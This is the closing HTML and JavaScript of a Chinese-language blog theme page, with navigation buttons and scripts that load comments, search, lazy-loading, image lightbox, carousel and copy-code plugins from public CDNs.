<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
            throw new Error('Network response was not ok.');
          }).then(function(data) {
            retryTimes = 0;
            utils.onLoadSuccess(el);
            callback(data);
          }).catch(function(error) {
            if (retryTimes > 0) {
              retryTimes -= 1;
              setTimeout(() => {
                req();
              }, 5000);
            } else {
              utils.onLoadFailure(el);
              onFailure();
            }
          });
        });
      }
      req();
    },
  };
</script>

<script>
  const sidebar = {
    leftbar: () => {
      if (l_body) {
        l_body.toggleAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    rightbar: () => {
      if (l_body) {
        l_body.toggleAttribute('rightbar');
        l_body.removeAttribute('leftbar');
      }
    },
    dismiss: () => {
      if (l_body) {
        l_body.removeAttribute('leftbar');
        l_body.removeAttribute('rightbar');
      }
    },
    toggleTOC: () => {
      document.querySelector('#data-toc').classList.toggle('collapse');
    }
  }
</script>

<!-- required -->
<script src="/js/main.js?v=1.28.1" async></script>

<!-- optional -->

  <script>
    function load_twikoo() {
        if (!document.querySelectorAll("#twikoo_container")[0]) return;
        utils.js('https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js', {defer: true}).then(function () {
            const el = document.getElementById("twikoo_container");
            var path = el.getAttribute('comment_id');
            if (!path) {
                path = decodeURI(window.location.pathname);
            }
            twikoo.init(Object.assign({"js":"https://gcore.jsdelivr.net/npm/twikoo@1.6.8/dist/twikoo.all.min.js","envId":"https://blog-comments-phi.vercel.app"}, {
                el: '#twikoo_container',
                path: path,
            }));
        });
    }

    window.addEventListener('DOMContentLoaded', (event) => {
        load_twikoo();
    });
</script>



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
<script>
  // https://www.npmjs.com/package/vanilla-lazyload
  // Set the options globally
  // to make LazyLoad self-initialize
  window.lazyLoadOptions = {
    elements_selector: ".lazy",
  };
  // Listen to the initialization event
  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });
</script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
  };
  var selector = '[data-fancybox]:not(.error)';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const els = document.getElementsByClassName('ds-memos');
    if (els != undefined && els.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
